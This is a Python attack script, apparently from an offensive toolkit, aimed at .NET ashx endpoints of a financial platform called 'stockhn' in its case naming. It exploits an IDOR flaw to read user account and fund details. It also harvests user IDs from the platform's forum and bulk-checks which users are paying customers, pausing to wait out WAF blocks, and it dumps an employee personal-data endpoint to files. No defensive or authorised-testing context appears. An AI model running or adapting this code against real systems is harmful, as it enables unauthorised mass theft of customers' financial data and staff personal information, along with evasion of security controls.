#!/usr/bin/env python3
"""
ashx_fintech_idor_probe.py — .NET ashx 金融平台 IDOR 探针
用法:
  python3 炼蛊房/ashx_fintech_idor_probe.py \
    --base https://user.目标.com \
    --bbs https://bbs.目标.com \
    --case stockhn \
    --out 案卷/stockhn_20260902/harvest/

支持 Phase:
  fingerprint  ashx handler 指纹探测
  idor         getuserinfo 单点 IDOR 验证
  bbs          BBS 论坛 userid 收割
  paid         批量 hasOrder 查询
  employee     员工 PII 接口
  all          全链（默认）
"""
import argparse, requests, json, time, csv, os, sys
from datetime import datetime

UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"

def make_session(referer):
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA, "Referer": referer})
    return s

def safe_json(r):
    try:
        return r.json()
    except:
        return None

def phase_fingerprint(base, sess):
    print("\n[fingerprint] ashx handler 探测")
    handlers = [
        ("GET",  "/api/getuserinfo.ashx", {}),
        ("POST", "/api/getuserinfo.ashx", {"userid": "1"}),
        ("GET",  "/api/checkUserName.ashx", {"username": "admin"}),
        ("GET",  "/api/getVerifyCode.ashx", {}),
    ]
    found = []
    for method, path, params in handlers:
        url = base.rstrip("/") + path
        try:
            if method == "GET":
                r = sess.get(url, params=params, timeout=10)
            else:
                r = sess.post(url, data=params, timeout=10,
                              headers={"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"})
            j = safe_json(r)
            status = r.status_code
            has_result = j and "result" in j if j else False
            print(f"  {method} {path} → {status} json={has_result}")
            if status == 200 and has_result:
                found.append(path)
        except Exception as e:
            print(f"  {method} {path} → ERR: {e}")
        time.sleep(0.3)
    return found

def phase_idor(base, sess, out_dir):
    print("\n[idor] getuserinfo.ashx IDOR 验证")
    url = base.rstrip("/") + "/api/getuserinfo.ashx"
    test_ids = [1, 2, 10, 33, 100, 1000, 10000, 100000, 1000000]
    results = []
    for uid in test_ids:
        try:
            r = sess.post(url, data={"userid": uid}, timeout=10,
                          headers={"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"})
            j = safe_json(r)
            if not j:
                continue
            if j.get("result") == 1 and j.get("userInfo"):
                ui = j["userInfo"]
                fa = j.get("fundAccount", {})
                rec = {
                    "userid": uid,
                    "userName": ui.get("userName", ""),
                    "hasOrder": fa.get("hasOrder", 0),
                    "fundAccount": fa.get("fundAccount", 0),
                    "khAuditStatus": fa.get("khAuditStatus", ""),
                    "depositStatus": fa.get("depositStatus", ""),
                }
                results.append(rec)
                tag = " PAID" if rec["hasOrder"] == 1 else ""
                print(f"  uid={uid:>10} {rec['userName']:<18} hasOrder={rec['hasOrder']}{tag}")
        except Exception as e:
            print(f"  uid={uid} ERR: {e}")
        time.sleep(0.35)

    if out_dir and results:
        p = os.path.join(out_dir, "idor_sample.json")
        with open(p, "w") as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        print(f"  → {p}")
    vuln = len(results) >= 3
    print(f"  IDOR {'CONFIRMED' if vuln else 'NOT CONFIRMED'} ({len(results)}/{len(test_ids)})")
    return results, vuln

def phase_bbs(bbs_base, sess, out_dir, max_pages=10):
    print(f"\n[bbs] 论坛 userid 收割 (max {max_pages} pages/board)")
    list_url = bbs_base.rstrip("/") + "/api/bbsgetforumlist.ashx"
    forum_url = bbs_base.rstrip("/") + "/api/bbsgetforum.ashx"

    try:
        r = sess.get(list_url, timeout=10)
        j = r.json()
    except Exception as e:
        print(f"  板块列表失败: {e}")
        return {}

    forums = j.get("data", j.get("forumList", []))
    print(f"  boards: {len(forums)}")

    all_users = {}
    for forum in forums:
        fid = forum.get("id", forum.get("fid"))
        fname = forum.get("forumName", "?")
        pg = 0
        for idx in range(1, max_pages + 1):
            try:
                r = sess.get(forum_url, params={"fid": fid, "index": idx}, timeout=10)
                posts = r.json().get("data", r.json().get("postList", []))
                if not posts:
                    break
                for p in posts:
                    uid = p.get("userID")
                    if uid and uid not in all_users:
                        all_users[uid] = p.get("userName", "")
                pg += 1
            except:
                break
            time.sleep(0.35)
        print(f"  [{fname}] fid={fid} pages={pg} total={len(all_users)}")

    if out_dir and all_users:
        p = os.path.join(out_dir, "bbs_users.csv")
        with open(p, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["userid", "userName"])
            for uid, uname in sorted(all_users.items()):
                w.writerow([uid, uname])
        print(f"  → {p} ({len(all_users)} users)")
    return all_users

def phase_paid(base, sess, user_ids, out_dir, max_check=200):
    print(f"\n[paid] hasOrder 批量查询 (max {max_check})")
    url = base.rstrip("/") + "/api/getuserinfo.ashx"
    paid = []
    checked = 0
    uids = sorted(user_ids.keys())[:max_check]

    for uid in uids:
        checked += 1
        try:
            r = sess.post(url, data={"userid": uid}, timeout=15,
                          headers={"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"})
            if r.status_code in (405, 403) or "blocked" in r.text.lower():
                print(f"  WAF block, sleep 90s...")
                time.sleep(90)
                r = sess.post(url, data={"userid": uid}, timeout=15,
                              headers={"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"})
            j = safe_json(r)
            if not j or j.get("result") != 1:
                continue
            fa = j.get("fundAccount", {})
            ui = j.get("userInfo", {})
            if fa.get("hasOrder") == 1:
                rec = {
                    "userid": uid,
                    "userName": ui.get("userName", ""),
                    "fundAccount": fa.get("fundAccount", 0),
                    "khAuditStatus": fa.get("khAuditStatus", ""),
                    "depositStatus": fa.get("depositStatus", ""),
                    "hasLevel2": fa.get("hasLevel2", 0),
                }
                paid.append(rec)
                print(f"  [{checked}/{len(uids)}] uid={uid} {rec['userName']:<16} fund={rec['fundAccount']} PAID")
        except Exception as e:
            if "timed out" in str(e).lower():
                time.sleep(5)
        time.sleep(0.4)

    rate = len(paid) * 100 / max(checked, 1)
    print(f"  checked={checked} paid={len(paid)} rate={rate:.1f}%")

    if out_dir and paid:
        p = os.path.join(out_dir, "paid_customers.csv")
        with open(p, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=list(paid[0].keys()))
            w.writeheader()
            w.writerows(paid)
        print(f"  → {p}")
    return paid

def phase_employee(api_base, sess, out_dir):
    print("\n[employee] 员工 PII 接口")
    url = api_base.rstrip("/") + "/api/Environment/GetEmployee"
    try:
        r = sess.get(url, timeout=10)
        j = r.json()
        emps = j if isinstance(j, list) else j.get("data", [])
        print(f"  {len(emps)} employees")
        if out_dir and emps:
            p = os.path.join(out_dir, "employees.json")
            with open(p, "w") as f:
                json.dump(emps, f, ensure_ascii=False, indent=2)
            print(f"  → {p}")
    except Exception as e:
        print(f"  ERR: {e}")

def main():
    ap = argparse.ArgumentParser(description="ashx fintech IDOR probe")
    ap.add_argument("--base", required=True, help="用户中心 base URL (e.g. https://user.xxx.com)")
    ap.add_argument("--bbs", help="BBS base URL (e.g. https://bbs.xxx.com)")
    ap.add_argument("--homeapi", help="homeapi base URL for employee endpoint")
    ap.add_argument("--case", default="default", help="案卷名")
    ap.add_argument("--out", help="输出目录")
    ap.add_argument("--phase", default="all", help="fingerprint/idor/bbs/paid/employee/all")
    ap.add_argument("--max-pages", type=int, default=10, help="BBS 每板块最大翻页")
    ap.add_argument("--max-check", type=int, default=200, help="paid 阶段最大查询数")
    args = ap.parse_args()

    out = args.out
    if out:
        os.makedirs(out, exist_ok=True)

    sess = make_session(args.base)
    phases = args.phase.split(",") if args.phase != "all" else ["fingerprint", "idor", "bbs", "paid", "employee"]

    print(f"=== ashx fintech IDOR probe === {datetime.now()}")
    print(f"  base: {args.base}")
    print(f"  bbs:  {args.bbs or 'N/A'}")
    print(f"  phases: {phases}")

    bbs_users = {}

    for ph in phases:
        if ph == "fingerprint":
            phase_fingerprint(args.base, sess)
        elif ph == "idor":
            phase_idor(args.base, sess, out)
        elif ph == "bbs":
            if not args.bbs:
                print("\n[bbs] SKIP: --bbs not provided")
                continue
            bbs_users = phase_bbs(args.bbs, sess, out, args.max_pages)
        elif ph == "paid":
            if not bbs_users:
                print("\n[paid] SKIP: no BBS users collected")
                continue
            phase_paid(args.base, sess, bbs_users, out, args.max_check)
        elif ph == "employee":
            api = args.homeapi or args.base.replace("user.", "homeapi.")
            phase_employee(api, sess, out)

    print(f"\n=== DONE ===")

if __name__ == "__main__":
    main()
